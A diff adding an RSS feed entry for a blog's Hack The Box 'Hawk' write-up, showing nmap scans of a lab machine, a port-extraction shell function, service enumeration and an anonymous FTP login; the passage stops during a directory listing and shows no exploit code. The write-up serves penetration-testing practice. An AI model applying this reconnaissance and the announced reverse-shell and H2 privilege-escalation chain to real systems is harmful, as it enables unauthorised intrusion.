@@ -6,7 +6,392 @@
     <description>Recent content in HTB on The Logan Lab</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 09 Jul 2022 16:36:37 -0500</lastBuildDate><atom:link href="https://theloganlab.github.io/tags/htb/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 11 Jul 2022 19:33:45 -0500</lastBuildDate><atom:link href="https://theloganlab.github.io/tags/htb/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HTB: Hawk</title>
+      <link>https://theloganlab.github.io/posts/hawk/</link>
+      <pubDate>Mon, 11 Jul 2022 19:33:45 -0500</pubDate>
+      
+      <guid>https://theloganlab.github.io/posts/hawk/</guid>
+      <description>Hawk is an easy HTB machine that offers a cryptography challenge with openssl.
+We will get credentials we can use with the Drupal website and from the admin panel we will get us a reverse shell.
+Finally we will abuse a H2 database to get to root.
+Recon Nmap nmap discovers some open ports:
+❯ nmap -p- -sS --min-rate 5000 --open -v -n -Pn 10.129.95.193 -oG allPorts Host discovery disabled (-Pn).</description>
+      <content>&lt;p&gt;&lt;strong&gt;Hawk&lt;/strong&gt; is an easy HTB machine that offers a cryptography challenge with openssl.&lt;/p&gt;
+&lt;p&gt;We will get credentials we can use with the &lt;strong&gt;Drupal&lt;/strong&gt; website and from the admin panel we will get us a reverse shell.&lt;/p&gt;
+&lt;p&gt;Finally we will abuse a H2 database to get to &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;
+&lt;h1 id=&#34;recon&#34;&gt;&lt;strong&gt;&lt;code&gt;Recon&lt;/code&gt;&lt;/strong&gt;&lt;/h1&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;Nmap&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;nmap&lt;/strong&gt; discovers some open ports:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ nmap -p- -sS --min-rate &lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt; --open -v -n -Pn 10.129.95.193 -oG allPorts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host discovery disabled &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;-Pn&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;. All addresses will be marked up and scan times may be slower.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.92 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2022-07-11 19:31 -05
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Initiating SYN Stealth Scan at 19:31
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Scanning 10.129.95.193 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65535&lt;/span&gt; ports&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Discovered open port 21/tcp on 10.129.95.193
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Discovered open port 80/tcp on 10.129.95.193
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Discovered open port 22/tcp on 10.129.95.193
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Discovered open port 9092/tcp on 10.129.95.193
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Discovered open port 5435/tcp on 10.129.95.193
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Discovered open port 8082/tcp on 10.129.95.193
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Completed SYN Stealth Scan at 19:31, 14.82s elapsed &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65535&lt;/span&gt; total ports&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.95.193
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.17s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65529&lt;/span&gt; closed tcp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;reset&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT     STATE SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;21/tcp   open  ftp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp   open  ssh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp   open  http
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;5435/tcp open  sceanics
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;8082/tcp open  blackice-alerts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;9092/tcp open  XmlIpcRegSvc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Read data files from: /usr/bin/../share/nmap
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 14.95 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;           Raw packets sent: &lt;span style=&#34;color:#ae81ff&#34;&gt;72513&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3.191MB&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; | Rcvd: &lt;span style=&#34;color:#ae81ff&#34;&gt;72513&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2.901MB&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We are exporting the result in &lt;strong&gt;grepable format&lt;/strong&gt;, which is great to manage with &lt;strong&gt;regex&lt;/strong&gt; and get all the ports without needing to type them one by one:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;1&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Here you have an useful function you can use for this manner&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+extractPorts () {
+	ports=&amp;#34;$(cat $1 | grep -oP &amp;#39;\d{1,5}/open&amp;#39; | awk &amp;#39;{print $1}&amp;#39; FS=&amp;#39;/&amp;#39; | xargs | tr &amp;#39; &amp;#39; &amp;#39;,&amp;#39;)&amp;#34;
+	ip_address=&amp;#34;$(cat $1 | grep initiated | awk &amp;#39;NF{print $NF}&amp;#39;)&amp;#34;
+	echo -e &amp;#34;\n[*] Extracting information...\n&amp;#34; &amp;gt; extractPorts.tmp
+	echo -e &amp;#34;\t[*] IP Address: $ip_address&amp;#34; &amp;gt;&amp;gt; extractPorts.tmp
+	echo -e &amp;#34;\t[*] Open ports: $ports\n&amp;#34; &amp;gt;&amp;gt; extractPorts.tmp
+	echo $ports | tr -d &amp;#39;\n&amp;#39; | xclip -sel clip
+	echo -e &amp;#34;[*] Ports copied to clipboard\n&amp;#34; &amp;gt;&amp;gt; extractPorts.tmp
+	/bin/batcat extractPorts.tmp
+	rm extractPorts.tmp
+}
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ extractPorts allPorts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Extracting information...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; IP Address: 10.129.95.193
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Open ports: 21,22,80,5435,8082,9092
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With nmap parameters &lt;strong&gt;-sCV&lt;/strong&gt; we can discover the service and version of each port:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ nmap -sCV -p21,22,80,5435,8082,9092 10.129.95.193 -oN targeted
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.92 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2022-07-11 20:24 -05
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.95.193
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.17s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT     STATE SERVICE       VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;21/tcp   open  ftp           vsftpd 3.0.3
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ftp-syst:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   STAT:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| FTP server status:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|      Connected to ::ffff:10.10.14.161
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|      Logged in as ftp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|      TYPE: ASCII
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|      No session bandwidth limit
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|      Session timeout in seconds is &lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|      Control connection is plain text
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|      Data connections will be plain text
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|      At session startup, client count was &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|      vsFTPd 3.0.3 - secure, fast, stable
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_End of status
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ftp-anon: Anonymous FTP login allowed &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;FTP code 230&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_drwxr-xr-x    &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; messages
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ssh-hostkey:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp   open  http          Apache httpd 2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-generator: Drupal &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;http://drupal.org&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| http-robots.txt: &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; disallowed entries &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; shown&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| /includes/ /misc/ /modules/ /profiles/ /scripts/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_/LICENSE.txt /MAINTAINERS.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-server-header: Apache/2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;5435/tcp open  tcpwrapped
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;8082/tcp open  http          H2 database http console
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: H2 Console
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;9092/tcp open  XmlIpcRegSvc?
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 19.36 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;&lt;strong&gt;&lt;code&gt;Enumeration&lt;/code&gt;&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;Port 80 hosts a &lt;strong&gt;Drupal 7&lt;/strong&gt; instance:&lt;/p&gt;
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw2.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;In the &lt;strong&gt;/CHANGELOG.TXT&lt;/strong&gt; we see that it&amp;rsquo;s not using a vulnerable version to the famous &lt;strong&gt;drupalgeddon&lt;/strong&gt; so there&amp;rsquo;s not much we can do for now until we have creds.&lt;/p&gt;
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw3.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Port 8082 is a H2 database we cannot access:&lt;/p&gt;
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw4.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;But let&amp;rsquo;s not forget this because we will for sure be able to access it from inside the victim machine.&lt;/p&gt;
+&lt;h1 id=&#34;finding-encrypted-file&#34;&gt;Finding encrypted file&lt;/h1&gt;
+&lt;p&gt;There&amp;rsquo;s also port 21 (ftp). Nmap has deployed the script ftp-anon and it shows that the anonymous login is available so we can login as user &lt;strong&gt;anonymous&lt;/strong&gt; and no password:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ ftp 10.129.95.193
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connected to 10.129.95.193.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;220&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Name &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.129.95.193:logan&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: anonymous
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;230&lt;/span&gt; Login successful.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Remote system type is UNIX.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Using binary mode to transfer files.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ftp&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Inside we can find a directory &lt;em&gt;messages&lt;/em&gt; with a hidden file inside we can download:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ftp&amp;gt; ls
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;229&lt;/span&gt; Entering Extended Passive Mode &lt;span style=&#34;color:#f92672&#34;&gt;(||&lt;/span&gt;|41160|&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x    &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; messages
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;226&lt;/span&gt; Directory send OK.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ftp&amp;gt; cd messages
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;250&lt;/span&gt; Directory successfully changed.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ftp&amp;gt; ls -la
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;229&lt;/span&gt; Entering Extended Passive Mode &lt;span style=&#34;color:#f92672&#34;&gt;(||&lt;/span&gt;|46903|&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x    &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; .
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x    &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; ftp      ftp          &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; ..
